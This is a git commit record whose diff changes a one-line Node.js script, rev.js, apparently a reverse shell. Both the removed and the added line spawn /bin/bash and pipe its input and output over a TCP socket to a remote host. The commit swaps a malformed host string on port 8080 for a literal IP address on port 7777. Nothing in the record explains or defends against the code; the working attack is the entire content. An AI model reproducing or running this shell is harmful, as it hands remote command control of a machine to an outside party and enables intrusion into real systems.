c18ce5610021fc139ce4842d8d4ad316615d75a0
warshipfucker <79971428+warshipfucker@users.noreply.github.com>
2023-10-27 17:51:56 +0300

    Update rev.js

--- rev.js
+++ rev.js
@@ -1,1 +1,1 @@
-var net = require("net"), sh = require("child_process").exec("/bin/bash");var client = new net.Socket();client.connect(8080, "https://2ip.ru/", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});
+var net = require("net"), sh = require("child_process").exec("/bin/bash");var client = new net.Socket();client.connect(7777, "176.38.226.79", function(){client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);});
